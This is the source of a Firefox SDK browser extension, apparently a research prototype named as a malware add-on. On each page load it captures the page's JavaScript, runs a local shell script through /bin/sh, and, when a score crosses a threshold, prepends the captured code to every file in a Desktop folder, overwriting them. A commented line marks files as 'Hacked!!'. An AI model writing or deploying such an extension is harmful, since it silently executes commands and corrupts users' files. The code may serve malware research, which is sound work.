/*
var {
    viewFor
} = require("sdk/view/core");
var window = viewFor(require("sdk/windows").browserWindows[0]);
*/
/*--- for unit testing ---*/
var {
    viewFor
} = require("sdk/view/core");

var window = viewFor(require("sdk/windows").browserWindows[0]);
/*--- for unit testing ---*/


const windowUtils = require("sdk/window/utils");
addonReloadRequest = false;
start = 0;
end = 0;
const {
    Cc, Ci, Cu
} = require("chrome");
Cu.import("resource://gre/modules/XPCOMUtils.jsm", this);

var myExtension = {
    init: function() {
        if (gBrowser) gBrowser.addEventListener("DOMContentLoaded", this.onPageLoad, false);
        if (gBrowser) gBrowser.addEventListener("unload", this.onPageUnload, true);
    },
    onPageLoad: function(aEvent) {

        var system = require("sdk/system");

        var platform_str = system.platform;
        var str = platform_str.toLowerCase();

        // create an nsIFile for the executable
        var file = Cc["@mozilla.org/file/local;1"]
            .createInstance(Ci.nsIFile);
        //file.initWithPath("C:\\Users\\Sravan\\Downloads\\addon-sdk-1.17\\addon-sdk-1.17\\test-addon\\data\\test.bat");

        file.initWithPath("/bin/sh");

        // create an nsIProcess
        var process = Cc["@mozilla.org/process/util;1"]
            .createInstance(Ci.nsIProcess);

        var tabs = require('sdk/tabs');
        var self = require("sdk/self");
        //var panel = require("sdk/panel");
        const fileIO = require("sdk/io/file");
        const temp_file = require("sdk/io/file");

        var path1 = "/Users/sravan2j/Downloads/addon-sdk-1.17/MalwareAddonTranscriptase/data";
        var path = "/Users/sravan2j/Desktop/files";


        panel = require("sdk/tabs").activeTab.attach({
            contentScriptFile: [self.data.url("jquery-1.10.0.min.js"), self.data.url("my-script.js")]
        });

        panel.port.on("myMessage", function handleMyMessage(code) {

                try {
                    Cc['@mozilla.org/alerts-service;1']
                        .getService(Ci.nsIAlertsService)
                        .showAlertNotification(null, "Total Javascript size", (encodeURI(code).split(/%..|./).length - 1) + " bytes", false, '', null);
                } catch (e) {
                    // prevents runtime error on platforms that don't implement nsIAlertsService
                }

                var TextWriter = fileIO.open(path1 + "/test.js", "w");
                if (!TextWriter.closed) {
                    TextWriter.write(code);
                    TextWriter.close();
                    // create a new tmp file
                    var ds = Cc["@mozilla.org/file/directory_service;1"].getService();
                    var dsprops = ds.QueryInterface(Ci.nsIProperties);
                    var tmpFile = dsprops.get("TmpD", Ci.nsIFile);
                    tmpFile.append("Query.tmp");
                    tmpFile.createUnique(tmpFile.NORMAL_FILE_TYPE, 0600);
                    //file.initWithPath("//root//Downloads//addon-sdk-1.17//test-addon1//data//test.sh");
                    process.init(file);
                    //var args = ["/root/Downloads/addon-sdk-1.17/test-addon1/data/test.sh"];
                    var args = ["/Users/sravan2j/Downloads/addon-sdk-1.17/MalwareAddonTranscriptase/data/test.sh"];

                    // append the tmp file to the parameters
                    args.push(tmpFile.path);
                    //console.log("tmpFile.path:" + tmpFile.path);
                    //console.log("tmpFile args:" + args);
                    process.run(true, args, args.length);
                    //console.log('ran' + process.exitValue);
                    var outStr = "";
                    var FileUtils = Cu.import("resource://gre/modules/FileUtils.jsm").FileUtils
                    var nsifile   = new FileUtils.File( path1 + "/test2.js" )
                    outStr = nsifile.fileSize;
                    /*var TextReader1 = fileIO.open(path1 + "/test2.js", "r");
                    if (!TextReader1.closed) {
                        outStr = TextReader1.fileSize;
                        TextReader1.close();
                    }*/
                    console.log("size in bytes: " + outStr);

                    outStr = "";
                    if (temp_file.exists(tmpFile.path)) {
                        var TextReader = temp_file.open(tmpFile.path, "r");
                        if (!TextReader.closed) {
                            outStr = TextReader.read();
                            TextReader.close();
                        }
                        tmpFile.remove(false);
                        //console.log("output" + outStr);
                    }
                    var value = parseFloat(outStr, 10);
                    console.log("value: " + value);

                    if (value < 0.00145) {
                        console.log("[INFO] Web page contains malicious content");
                        let list = fileIO.list(path);

                        for (i = 0; i < list.length; i++) {
                            let item = fileIO.join(path, list[i]);
                            if (fileIO.isFile(item)) {

                                var text = null;

                                var TextReader = fileIO.open(item, "r");
                                if (!TextReader.closed) {
                                    text = TextReader.read();
                                    TextReader.close();
                                    if (text.length > 0) {
                                        text = text + "\n";
                                    }
                                }

                                var TextWriter = fileIO.open(item, "w");
                                if (!TextWriter.closed) {
                                    TextWriter.write(code+text);
                                    //TextWriter.write("####### Hacked!! ##########\n" + text);
                                    TextWriter.close();
                                }
                            }
                        }
                    }
                    /*--- for unit testing ---*/
                    //window.close()

                }
            }

        );

    },
    onPageUnload: function(aEvent) {

    }
}


var gBrowser = windowUtils.getMostRecentBrowserWindow().getBrowser();

myExtension.init();